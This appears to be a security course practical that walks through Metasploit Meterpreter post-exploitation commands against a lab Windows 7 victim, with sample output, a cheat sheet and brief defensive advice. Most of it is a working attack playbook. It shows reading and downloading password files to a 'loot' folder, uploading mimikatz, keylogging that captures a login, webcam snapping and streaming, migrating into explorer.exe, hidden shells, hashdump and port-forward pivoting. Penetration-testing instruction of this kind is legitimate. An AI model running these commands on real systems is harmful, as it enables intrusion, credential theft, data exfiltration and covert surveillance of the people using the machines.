# Practical 6: Meterpreter Commands Reference

## Objective

In this practical we explore the most important **Meterpreter** commands used after a successful exploit. Meterpreter is Metasploit's flagship post-exploitation payload — an in-memory shell that runs entirely in the compromised process, never touching disk, and exposes a rich scriptable API for reconnaissance, file ops, pivoting, screen/keyboard/webcam capture, and process control.

Assume you have a Meterpreter session open (e.g. from BlueKeep in Practical 5 or any Windows exploit). The session prompt looks like:

```
meterpreter >
```

---

## System Information

### `sysinfo` — Target system details

```
meterpreter > sysinfo
Computer        : WIN7-VICTIM
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

### `ifconfig` / `ipconfig` — Network interfaces

```
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1

Interface 11
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:ab:cd:ef
MTU          : 1500
IPv4 Address : 192.168.56.160
IPv4 Netmask : 255.255.255.0
```

### `getuid` — Effective user

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### `getpid` — PID of the Meterpreter process

```
meterpreter > getpid
Current pid: 2348
```

---

## File-System Navigation

### `pwd` — Current working directory

```
meterpreter > pwd
C:\Windows\system32
```

### `cd` — Change directory

```
meterpreter > cd C:\\Users\\Administrator\\Desktop
meterpreter > pwd
C:\Users\Administrator\Desktop
```

### `ls` — List directory contents

```
meterpreter > ls

Listing: C:\Users\Administrator\Desktop
======================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  282    fil   2026-03-14 11:22:01 +0530  desktop.ini
100666/rw-rw-rw-  18432  fil   2026-04-09 09:18:33 +0530  passwords.xlsx
100666/rw-rw-rw-  2048   fil   2026-04-10 14:55:12 +0530  secrets.txt
```

### `cat` — Read a file

```
meterpreter > cat secrets.txt
DB-prod: admin / P@ssw0rd2026
VPN: ops / W3lc0me!
```

---

## File Transfer

### `download` — Copy a file from target to attacker

```
meterpreter > download passwords.xlsx /root/loot/
[*] Downloading: passwords.xlsx -> /root/loot/passwords.xlsx
[*] Downloaded 18.00 KiB of 18.00 KiB (100.0%)
[*] download   : passwords.xlsx -> /root/loot/passwords.xlsx
```

### `upload` — Push a file from attacker to target

Always supply the full path on both sides:

```
meterpreter > upload /root/tools/mimikatz.exe C:\\Windows\\Temp\\mk.exe
[*] uploading  : /root/tools/mimikatz.exe -> C:\Windows\Temp\mk.exe
[*] uploaded   : /root/tools/mimikatz.exe -> C:\Windows\Temp\mk.exe
```

### `rm` — Delete a file

```
meterpreter > rm C:\\Windows\\Temp\\mk.exe
```

---

## Session Management

### `background` — Push the session into the background

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(...) >
```

### `sessions -l` — List active sessions

```
msf6 > sessions -l

Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         meterpreter x64/win    SYSTEM @ WIN7-VICTIM 192.168.56.101:4444 -> 192.168.56.160:49215
```

### `sessions -i <id>` — Resume a session

```
msf6 > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```

### `sessions -K` — Kill all sessions

---

## Keylogging

### `keyscan_start` — Begin recording keystrokes

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```

### `keyscan_dump` — Dump captured keystrokes

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
gmail.com<Tab>jane.doe@example.com<Tab>Summ3r2026!<Return>
```

### `keyscan_stop`

```
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

> For best results, `migrate` into `explorer.exe` first — it sees keystrokes typed into other windows.

---

## Process Control

### `ps` — List running processes

```
meterpreter > ps

Process List
============

 PID   Name                 Arch  Session  User                          Path
 ---   ----                 ----  -------  ----                          ----
 4     System               x64   0
 364   smss.exe             x64   0        NT AUTHORITY\SYSTEM
 540   csrss.exe            x64   0        NT AUTHORITY\SYSTEM
 716   explorer.exe         x64   1        WIN7-VICTIM\admin
 2348  rundll32.exe         x64   1        NT AUTHORITY\SYSTEM           ← Meterpreter
 2812  notepad.exe          x64   1        WIN7-VICTIM\admin
```

### `migrate <pid>` — Move into another process

```
meterpreter > migrate 716
[*] Migrating from 2348 to 716...
[*] Migration completed successfully.

meterpreter > getpid
Current pid: 716
```

Useful to:

- Survive when the exploited process exits.
- Inherit a higher-privilege token.
- Capture keystrokes from `explorer.exe`.

### `execute -f <prog>` — Launch a program

```
meterpreter > execute -f notepad.exe
Process 3104 created.
```

To start a process **hidden + interactive**:

```
meterpreter > execute -f cmd.exe -H -i
```

---

## Screen / Camera Capture

### `screenshot` — Save a desktop screenshot

```
meterpreter > screenshot
Screenshot saved to: /root/jOLkRpRA.jpeg
```

### `webcam_list` — Enumerate cameras

```
meterpreter > webcam_list
1: Integrated Webcam
```

### `webcam_snap` — Take a single photo

```
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/RaPdjbDX.jpeg
```

### `webcam_stream` — Live video stream

```
meterpreter > webcam_stream
[*] Starting...
[*] Preparing player...
[*] Opening player at: /root/dKbzcCax.html
```

A browser opens displaying the live feed.

> Modern Windows shows the camera-in-use indicator (LED on the device); the practical demonstrates the *capability*, not stealth.

---

## Drop to OS Shell

### `shell` — Spawn a native command prompt

```
meterpreter > shell
Process 2916 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.

C:\Windows\system32>whoami
nt authority\system
```

Press `Ctrl+Z` (or type `exit`) to return to Meterpreter.

---

## Quick Reference (Cheat Sheet)

| Category          | Command                                       |
| ----------------- | --------------------------------------------- |
| System info       | `sysinfo`, `ifconfig`, `getuid`, `getpid`     |
| FS navigation     | `pwd`, `cd`, `ls`, `cat`, `search -f *.docx`  |
| File transfer     | `download <src> <dst>`, `upload <src> <dst>`, `rm` |
| Sessions          | `background`, `sessions -l`, `sessions -i N`, `sessions -K` |
| Keylogging        | `keyscan_start`, `keyscan_dump`, `keyscan_stop` |
| Processes         | `ps`, `migrate <pid>`, `kill <pid>`, `execute -f` |
| Screen / cam      | `screenshot`, `webcam_snap`, `webcam_stream`  |
| Privilege         | `getsystem`, `hashdump` (after SYSTEM), `run post/windows/gather/...` |
| Networking        | `route`, `portfwd add -l 8080 -p 80 -r host`, `arp` |
| Shell             | `shell`                                       |
| Help              | `help`, `help <command>`                      |

---

## Defensive Recommendations

- **Endpoint Detection and Response (EDR)** flags Meterpreter's stage-loading and in-memory DLL injection.
- **AppLocker / WDAC** prevents arbitrary process execution.
- **Disable LSA secrets caching** and use Credential Guard to defeat `hashdump`.
- **Camera and microphone hardware-level off-switches / privacy shutters** for laptops.
- **Microsegmentation** so even a compromised host can't pivot freely with `portfwd`/`route`.
- **Logging** — Sysmon + Windows Event Forwarding captures process creation, network connections, and DLL loads that reveal Meterpreter activity.

---

## Disclaimer

For **educational purposes** only. Run only against systems you own or are authorised to test.
